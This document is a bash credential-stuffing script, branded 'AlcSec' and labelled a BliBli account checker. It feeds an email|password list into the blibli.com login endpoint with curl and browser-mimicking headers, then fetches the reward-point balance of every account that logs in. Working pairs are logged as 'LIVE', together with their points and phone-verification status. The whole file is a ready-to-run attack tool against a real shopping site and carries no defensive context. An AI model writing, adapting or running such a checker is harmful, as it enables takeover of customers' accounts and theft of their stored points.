#!/bin/bash
RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
ORANGE='\033[0;33m'
PUR='\033[0;35m'
GRN="\e[32m"
WHI="\e[37m"
NC='\033[0m'

echo ""
printf "   $WHI ============================================================ \n"
printf "   $GRN#       $RED█████╗ ██╗      ██████╗███████╗███████╗ ██████╗  $GRN	#\n"
printf "   $GRN#       $RED██╔══██╗██║     ██╔════╝██╔════╝██╔════╝██╔════╝ $GRN	#\n"
printf "   $GRN#       $RED███████║██║     ██║     ███████╗█████╗  ██║  $GRN	#\n"     
printf "   $GRN#       $RED██╔══██║██║     ██║     ╚════██║██╔══╝  ██║  $GRN	#\n"     
printf "   $GRN#       $RED██║  ██║███████╗╚██████╗███████║███████╗╚██████╗ $GRN	#\n"
printf "   $GRN#       $RED╚═╝  ╚═╝╚══════╝ ╚═════╝╚══════╝╚══════╝ ╚═════╝ $GRN	#\n"
printf "   $WHI ------------------------------------------------------------ \n"
printf "   $YELLOW		     BliBli Account Checkers				\n"
printf "\n"
printf "   $YELLOW		   	  -AlchaDecode-				\n"
printf "   $WHI ============================================================ \n"
printf "$NC\n"


# Asking user whenever the
# parameter is blank or null
  # Print available file on
  # current folder
  # clear
  read -p "Show Directory Tree(Y/n): " show
  if [[ ${show,,} == 'y' ]]; then
  echo ""
  tree
  echo ""
  fi
  read -p "Enter mailist file: " inputFile
  if [[ ! $inputFile ]]; then
  printf "$YELLOW Please input the file \n"
  exit
  fi
  if [ ! -e $inputFile ]; then
  printf "$YELLOW File not found \n"
  exit
  fi
  
  if [[ $targetFolder == '' ]]; then
  read -p "Enter target folder: " targetFolder
  # Check if result folder exists
  # then create if it didn't
  if [[ ! $targetFolder ]]; then
  echo "Creating Hasil/ folder"
    mkdir Hasil
    targetFolder="Hasil"
  fi
  if [[ ! -d "$targetFolder" ]]; then
    echo "Creating $targetFolder/ folder"
    mkdir $targetFolder
  else
    read -p "$targetFolder/ folder exists, append to them?(Y/n): " isAppend
    if [[ $isAppend == 'n' ]]; then
    printf "$YELLOW == Thanks For Using AlcSec == \n"
      exit
    fi
  fi
else
  if [[ ! -d "$targetFolder" ]]; then
    echo "Creating $targetFolder/ folder"
    mkdir $targetFolder
  fi
fi
totalLines=`grep -c "@" $inputFile`
con=1
printf "$CYAN=================================\n"
printf "$YELLOW       CHECKING PROCESS\n"
printf "$CYAN=================================\n"
check(){
header="`date +%H:%M:%S`"
login=$(curl -s --cookie-jar cookies.txt 'https://www.blibli.com//backend/common/users/_login' -H 'origin: https://www.blibli.com' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: en-US,en;q=0.9' -H 'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36' -H 'content-type: application/json;charset=UTF-8' -H 'accept: application/json, text/plain, */*' -H 'referer: https://www.blibli.com/' -H 'authority: www.blibli.com'  -H 'x-ts-ajax-request: true' --data-binary '{"username":"'$1'","password":"'$2'"}' --compressed);
point=$(curl -b cookies.txt -s 'https://www.blibli.com/backend/member/rewards' -H 'accept-language: en-US,en;q=0.9' -H 'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36' -H 'accept: application/json, text/plain, */*' -H 'cache-control: no-cache' -H 'authority: www.blibli.com' -H 'x-requested-with: XMLHttpRequest' -H 'referer: https://www.blibli.com/member/poin-rewards')
if [[ $login = *"UNAUTHORIZED"* ]]; then
  printf "$RED [ DIE ] $ORANGE[$header] $PUR[ ./Alchmst] \n";
  echo "[DIE] $1|$2 - $login" >> $3/ResultBliBliDie.tmp
elif [[ $login = *'"code":200,"status":"OK"'* ]]; then
  active=$(echo "$point" | grep -Po '(?<="totalActivePoint":)[^,]*');
  verif=$(echo "$login" | grep -Po '(?<="needVerifiedPhoneNumber":)[^,]*');
  printf "$GRN [ Active Point: $active ] [ VerifPhone: $verif ] $ORANGE[$header] $PUR[ ./Alchmst] \n";
  echo "[LIVE] $1|$2 - [ Active Point: $active ] [ VerifPhone: $verif ]">> $3/ResultBliBliLive.tmp
else
  echo $login;
  echo "[UNKNOWN] $1|$2 - $login">> $3/ResultBliBliUnknown.tmp
fi
}
SECONDS=0
for mailpass in $(cat $inputFile); do
	email=$(echo $mailpass | cut -d "|" -f 1)
	pass=$(echo $mailpass | cut -d "|" -f 2)
	jmail=${#email}
	jpass=${#pass}
	indexer=$((con++))
	printf "$CYAN $totalLines/$indexer $NC $email|$pass - "
	check $email $pass $targetFolder
done
duration=$SECONDS
printf "$YELLOW $(($duration / 3600)) hours $(($duration / 60)) minutes and $(($duration % 60)) seconds elapsed. \n"
printf "$YELLOW=============== AlcSec - AlchaDecode =============== \n"
